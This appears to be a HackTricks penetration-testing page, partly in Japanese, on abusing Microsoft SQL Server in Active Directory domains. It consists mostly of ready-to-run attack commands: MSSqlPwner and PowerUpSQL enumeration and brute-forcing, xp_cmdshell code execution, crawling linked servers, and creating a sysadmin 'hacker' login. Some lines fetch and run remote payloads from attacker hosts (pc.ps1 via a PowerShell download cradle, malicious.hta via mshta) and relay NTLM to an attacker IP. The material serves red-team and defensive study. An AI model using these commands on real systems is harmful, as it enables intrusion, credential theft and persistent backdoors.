# MSSQL AD Abuse

{{#include ../../banners/hacktricks-training.md}}


## **MSSQL Enumeration / Discovery**

### Python

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) tool は Impacket をベースにしています。Kerberos tickets による認証と、linked-server chain 経由の攻撃をサポートしています。<sup>[[1]](#references)</sup>

<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
```shell
# Interactive mode
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

# Interactive mode with 2 depth level of impersonations

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -max-impersonation-depth 2 interactive

# Executing custom assembly on the current server with windows authentication and executing hostname command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate

# Issuing NTLM relay attack on the SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250

# Executing direct query

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"

# Retrieving password from the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password

# Execute code using custom assembly on the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll

# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt

```
### ドメインセッションなしでネットワークから列挙する
```

# Interactive mode

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

```
---
### PowerShell

PowerShell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) は、SQL Server 環境における discovery、auditing、exploitation の機能を提供します。<sup>[[2]](#references)</sup>
```bash
Import-Module .\PowerupSQL.psd1
```
### ドメインセッションなしでネットワークから列挙する
```bash
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have an AD account, you can try to find MSSQL instances by scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### ドメイン内部からの列挙
```bash
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

# Try dictionary attack to login
Invoke-SQLAuditWeakLoginPw

# Search SPNs of common software and try the default creds
Get-SQLServerDefaultLoginPw

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check connectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in one line
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL基本Abuse

### DBへのAccess
```bash
# List databases
Get-SQLInstanceDomain | Get-SQLDatabase

# List tables in a DB you can read
Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName

# List columns in a table
Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName

# Get some sample data from a column in a table (columns username & password in the example)
Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10

#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lot of CSVs are generated in the current directory)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

`xp_cmdshell`を介してMSSQL host上で**commandsを実行**できる場合もあります。<sup>[[5]](#references)</sup>
```bash
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
以下の**セクションで言及されているページ**を確認し、これを手動で行う方法を確認してください。

### MSSQL Basic Hacking Tricks


{{#ref}}
../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
{{#endref}}

## MSSQL Trusted Links

ある MSSQL instance が linked-server configuration を介して別の instance を信頼している場合、十分な権限を持つユーザーは、**その信頼関係を利用して、もう一方の instance 上で queries を実行できます**。これらの links は chained できるため、最終的にユーザーが commands を実行できる misconfigured server に到達する可能性があります。<sup>[[3]](#references)</sup>

**databases 間の links は、forest trusts をまたいでも機能します。**

### Powershell Abuse
```bash
#Look for MSSQL links from an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkId > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted-link query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
使用できる別のツールとして、[**SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn) があります：<sup>[[6]](#references)</sup>
```bash
SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
# Cobalt Strike
inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
```
### Metasploit

Metasploitを使用すると、trusted linksを簡単に確認できます。
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Metasploit は `OPENQUERY()` function のみを abuse しようとします。`OPENQUERY()` を介した command execution に失敗した場合は、以下で説明するように、**手動で** `EXECUTE` method を試してください。<sup>[[4]](#references)</sup>

### Manual - Openquery()

**Linux** からは、**sqsh** と **mssqlclient.py** を使用して MSSQL console shell を取得できます。

**Windows** からは、[**HeidiSQL**](https://www.heidisql.com) などの **MSSQL client** を使用して、links を確認し、commands を手動で実行することもできます。<sup>[[7]](#references)</sup>

_Windows authentication を使用して login:_

![Metasploit - Manual - Openquery(): Windows authentication を使用して login](<../../images/image (808).png>)

#### Trustable Links を検索する
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![Manual - Openquery() - 信頼できるリンクを検索: EXEC sp linkedservers;](<../../images/image (716).png>)

#### 信頼できるリンクでクエリを実行

リンク経由でクエリを実行します（例: 新たにアクセス可能になったインスタンス内で、さらにリンクを検索する）:
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
> [!WARNING]
> 二重引用符と単一引用符がどこで使用されているかを確認してください。正しく使い分けることが重要です。

![信頼できるリンクを見つける - 信頼できるリンクでクエリを実行する: 二重引用符と単一引用符がどこで使用されているかを確認してください。正しく使い分けることが重要です](<../../images/image (643).png>)

これらの信頼できるリンクのチェーンは、手動で引き続きたどることができます。
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
`OPENQUERY()`を通じて`exec xp_cmdshell`などのアクションを実行できない場合は、`EXECUTE` methodを試してください。

### Manual - EXECUTE

`EXECUTE`を使用してtrusted linksをabuseすることもできます：
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## ローカル権限昇格

**MSSQL service account** には、認証後にクライアントを impersonate できる **`SeImpersonatePrivilege`** user right が付与されていることがよくあります。

多くの authors が考案してきた strategy は、攻撃者が作成した rogue または man-in-the-middle service に SYSTEM service を強制的に authenticate させることです。この rogue service は、SYSTEM service が authenticate しようとしている間、その SYSTEM service を impersonate できます。

[SweetPotato](https://github.com/CCob/SweetPotato) は、これらの technique のいくつかをまとめたもので、Beacon の `execute-assembly` command を通じて実行できます。<sup>[[8]](#references)</sup>



### SCCM Management Point NTLM Relay (OSD Secret Extraction)
SCCM の **Management Points** における default SQL roles を悪用し、site database から Network Access Account と Task-Sequence secrets を直接 dump する方法については、以下を参照してください。

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

## References

- [1] [ScorpionesLabs – MSSqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
- [2] [NetSPI – PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [3] [Microsoft Learn – Linked servers (Database Engine)](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver17)
- [4] [Microsoft Learn – OPENQUERY](https://learn.microsoft.com/en-us/sql/t-sql/functions/openquery-transact-sql?view=sql-server-ver17)
- [5] [Microsoft Learn – xp_cmdshell server configuration option](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver17)
- [6] [lefayjey – SharpSQLPwn](https://github.com/lefayjey/SharpSQLPwn)
- [7] [HeidiSQL](https://www.heidisql.com)
- [8] [CCob – SweetPotato](https://github.com/CCob/SweetPotato)
{{#include ../../banners/hacktricks-training.md}}
